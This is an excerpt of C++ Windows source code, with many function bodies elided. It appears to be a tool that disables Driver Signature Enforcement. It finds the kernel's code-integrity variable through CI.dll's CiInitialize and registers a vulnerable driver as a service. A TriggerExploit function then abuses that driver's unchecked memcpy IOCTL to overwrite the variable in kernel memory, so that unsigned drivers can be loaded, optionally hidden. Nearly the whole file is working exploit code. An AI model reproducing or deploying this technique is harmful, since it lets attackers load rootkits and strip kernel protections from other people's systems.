...
static NTSTATUS FindKernelModule(_In_ PCCH ModuleName, _Out_ PULONG_PTR ModuleBase)
{
    *ModuleBase = 0;
    ...
    const PRTL_PROCESS_MODULES Modules = static_cast<PRTL_PROCESS_MODULES>(
...
// For Windows Vista/7
static LONG QueryCiEnabled(_In_ PVOID MappedBase, _In_ SIZE_T SizeOfImage, _In_ ULONG_PTR KernelBase,
...
static LONG QueryCiOptions(_In_ PVOID MappedBase, _In_ ULONG_PTR KernelBase, _Out_ PULONG_PTR gCiOptionsAddress)
{
    *gCiOptionsAddress = 0;
    ...
    const PUCHAR CiInitialize =
        reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
...
NTSTATUS
AnalyzeCi(_Out_ PVOID *CiOptionsAddress)
{
    *CiOptionsAddress = nullptr;
    WCHAR Path[MAX_PATH];
    const CHAR NtoskrnlExe[] = "ntoskrnl.exe";
    const CHAR CiDll[] = "CI.dll";
    _snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot,
...
static NTSTATUS CreateDriverService(PWCHAR ServiceName, PWCHAR FileName)
{
    ...
    Status = RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, ServiceName, L"ImagePath", REG_SZ, NtPath,
                                   ConvertToNtPath(NtPath, FileName));
    if (!NT_SUCCESS(Status))
        return Status;

    Status =
        RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, ServiceName, L"Type", REG_DWORD, &ServiceType, sizeof(ServiceType));
    return Status;
}
...
static BOOLEAN IsCiEnabled()
{
    ...
    const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation, &CiInfo, sizeof(CiInfo), nullptr);
    if (!NT_SUCCESS(Status))
        Printf(L"Failed to query code integrity status: %08X\n", Status);

    return (CiInfo.CodeIntegrityOptions & (CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) ==
...
static NTSTATUS OpenDeviceHandle(_Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors)
{
    ...
    const NTSTATUS Status =
        NtCreateFile(DeviceHandle,
                     SYNCHRONIZE,    // Yes, these really are the only access rights needed. (actually would be 0, but we
                                     // want SYNCHRONIZE to wait on NtDeviceIoControlFile)
...
static NTSTATUS TriggerExploit(_In_ PWSTR LoaderServiceName, _In_ PVOID CiVariableAddress, _In_ ULONG CiOptionsValue,
                               _Out_opt_ PULONG OldCiOptionsValue)
{
    ...
    if (OldCiOptionsValue != nullptr)    // Only perform this read if the original value was requested
    {
        ...
        Status = NtDeviceIoControlFile(DeviceHandle, nullptr, nullptr, nullptr, &IoStatusBlock, IOCTL_GIO_MEMCPY,
                                       &MemcpyInput, sizeof(MemcpyInput), nullptr, 0);
        if (!NT_SUCCESS(Status))
        {
    ...
    MemcpyInput.Src = CiPatchSize == sizeof(ULONG) ? reinterpret_cast<ULONG_PTR>(&CiOptionsValue)
                                                   : reinterpret_cast<ULONG_PTR>(&CiOptionsValueByte);
    MemcpyInput.Size = CiPatchSize;

    // IOCTL (2): Use the driver IOCTL's juicy memcpy that performs zero access checks to write the desired value to the
    // kernel address
    RtlZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
    Status = NtDeviceIoControlFile(DeviceHandle, nullptr, nullptr, nullptr, &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput,
                                   sizeof(MemcpyInput), nullptr, 0);
    if (!NT_SUCCESS(Status))
...
NTSTATUS
WindLoadDriver(_In_ PWCHAR LoaderName, _In_ PWCHAR DriverName, _In_ BOOLEAN Hidden)
{
    ...
    Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
    if (!NT_SUCCESS(Status))
    {
    ...
    if (!NT_SUCCESS(Status))
    {
        ...
        Status = STATUS_SUCCESS;    // Don't DeleteService() the target driver in the error path below; we are past the point
                                    // of no return
    }
    else
    {
...
NTSTATUS
WindUnloadDriver(_In_ PWCHAR DriverName, _In_ BOOLEAN Hidden)
{
    CONSTEXPR CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
    BOOLEAN SeLoadDriverWasEnabled;
